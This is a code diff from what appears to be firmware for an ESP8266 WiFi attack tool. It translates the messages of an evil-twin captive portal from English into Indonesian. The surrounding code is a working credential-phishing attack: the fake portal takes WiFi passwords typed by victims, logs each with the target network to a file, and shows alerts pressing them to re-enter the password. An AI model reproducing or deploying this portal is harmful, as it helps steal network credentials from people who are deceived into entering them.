@@ -673,7 +673,7 @@ namespace wifi {
     }
     void proses(){
                   if (WiFi.status() != WL_CONNECTED) {
-                          server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/order.html';}, 3000);  alert('Failed to connect to WiFi,check ssid or password again');</script>");
+                          server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/order.html';}, 3000);  alert('gagal menghubungkan..periksa password anda lagi..');</script>");
                         }
                   else {
                     
@@ -706,15 +706,15 @@ namespace wifi {
       server.on("/result",[](){
            if (WiFi.status() != WL_CONNECTED) {
               String tmp = "<tr><td> <label> web portal : "+String(eviltwinpath)+", target : "+ accesspoints.selected_target + ", password : "+ tes_password +"</label></td></tr>";
-              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Failed..,check the pasword again');</script>");
+              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Password gagal!! masukkan ulang password anda..');</script>");
               File log_captive = LittleFS.open("/log.txt","a");
               log_captive.println(tmp);
-              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Failed..,check the pasword again');</script>");
-              Serial.println("Wrong password tried !");
+              server.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Password gagal!! masukkam ulang password anda..');</script>");
+              Serial.println("password salah coba lagi !");
               tes_password = "";
                log_captive.close();
             } else {
-              server.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Success..,please wait a bit...</h2></body> </html>");
+              server.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Sukses..,mohon tunggu sebentar...</h2></body> </html>");
               attack.eviltwin = false;
               //ledstatus = 35;
               //hotspot_active = false;
